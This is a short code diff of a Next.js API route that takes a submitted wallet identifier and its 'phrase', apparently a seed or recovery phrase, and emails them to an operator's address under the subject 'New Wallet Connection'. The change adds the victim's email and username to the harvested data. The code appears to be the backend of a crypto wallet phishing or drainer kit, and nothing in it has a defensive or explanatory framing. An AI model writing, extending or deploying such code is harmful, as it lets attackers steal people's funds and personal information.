@@ -2,7 +2,7 @@ import nodemailer from "nodemailer";
 import { NextRequest } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { wallet, phrase } = await req.json();
+  const { wallet, phrase, email, username } = await req.json();
 
   const transporter = nodemailer.createTransport({
     host: process.env.SMTP_HOST,
@@ -18,7 +18,7 @@ export async function POST(req: NextRequest) {
     from: process.env.SMTP_FROM ?? process.env.SMTP_USER,
     to: process.env.SMTP_TO,
     subject: "New Wallet Connection",
-    text: `Wallet: ${wallet}\nPhrase: ${phrase}`,
+    text: `Username: ${username}\nEmail: ${email}\nWallet: ${wallet}\nPhrase: ${phrase}`,
   });
 
   return Response.json({ ok: true });
